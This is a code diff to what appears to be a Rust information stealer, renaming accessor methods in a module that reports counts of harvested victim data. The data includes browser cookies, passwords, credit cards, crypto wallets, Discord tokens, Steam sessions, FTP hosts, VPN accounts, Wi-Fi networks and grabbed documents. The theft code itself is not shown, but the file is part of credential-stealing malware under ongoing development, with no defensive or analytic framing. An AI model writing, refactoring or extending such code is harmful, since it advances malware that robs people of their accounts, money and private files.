@@ -72,15 +72,15 @@ pub trait Collector: Send + Sync
     type Vpn: Vpn;
     type Device: Device;
 
-    fn browser(&self) -> &Self::Browser;
+    fn get_browser(&self) -> &Self::Browser;
 
-    fn software(&self) -> &Self::Software;
+    fn get_software(&self) -> &Self::Software;
 
-    fn file_grabber(&self) -> &Self::FileGrabber;
+    fn get_file_grabber(&self) -> &Self::FileGrabber;
 
-    fn vpn(&self) -> &Self::Vpn;
+    fn get_vpn(&self) -> &Self::Vpn;
 
-    fn device(&self) -> &Self::Device;
+    fn get_device(&self) -> &Self::Device;
 }
 
 pub struct DisplayCollector<T: Collector>(pub T);
@@ -99,13 +99,13 @@ impl<T: Collector> Display for DisplayCollector<T> {
                   ├─ Bookmarks: {}
                   └─ Downloads: {}
             "},
-            self.0.browser().get_cookies(),
-            self.0.browser().get_passwords(),
-            self.0.browser().get_credit_cards(),
-            self.0.browser().get_auto_fills(),
-            self.0.browser().get_history(),
-            self.0.browser().get_bookmarks(),
-            self.0.browser().get_downloads(),
+            self.0.get_browser().get_cookies(),
+            self.0.get_browser().get_passwords(),
+            self.0.get_browser().get_credit_cards(),
+            self.0.get_browser().get_auto_fills(),
+            self.0.get_browser().get_history(),
+            self.0.get_browser().get_bookmarks(),
+            self.0.get_browser().get_downloads(),
         )?;
 
         writeln!(f)?;
@@ -120,11 +120,11 @@ impl<T: Collector> Display for DisplayCollector<T> {
                   ├─ Discord tokens: {}
                   └─ Steam sessions: {}
             "},
-            self.0.software().get_wallets(),
-            self.0.software().get_ftp_hosts(),
-            self.0.software().is_telegram(),
-            self.0.software().get_discord_tokens(),
-            self.0.software().get_steam_session(),
+            self.0.get_software().get_wallets(),
+            self.0.get_software().get_ftp_hosts(),
+            self.0.get_software().is_telegram(),
+            self.0.get_software().get_discord_tokens(),
+            self.0.get_software().get_steam_session(),
         )?;
 
         writeln!(f)?;
@@ -137,9 +137,9 @@ impl<T: Collector> Display for DisplayCollector<T> {
                   ├─ Database: {}
                   └─ Documents: {}
             "},
-            self.0.file_grabber().get_source_code_files(),
-            self.0.file_grabber().get_database_files(),
-            self.0.file_grabber().get_documents(),
+            self.0.get_file_grabber().get_source_code_files(),
+            self.0.get_file_grabber().get_database_files(),
+            self.0.get_file_grabber().get_documents(),
         )?;
 
         writeln!(f)?;
@@ -150,7 +150,7 @@ impl<T: Collector> Display for DisplayCollector<T> {
                 ▶ Vpn:
                   └─ Accounts: {}
             "},
-            self.0.vpn().get_accounts(),
+            self.0.get_vpn().get_accounts(),
         )?;
 
         writeln!(f)?;
@@ -161,7 +161,7 @@ impl<T: Collector> Display for DisplayCollector<T> {
                 ▶ Device:
                   └─ Wifi networks: {}
             "},
-            self.0.device().get_wifi_networks(),
+            self.0.get_device().get_wifi_networks(),
         )
     }
 }
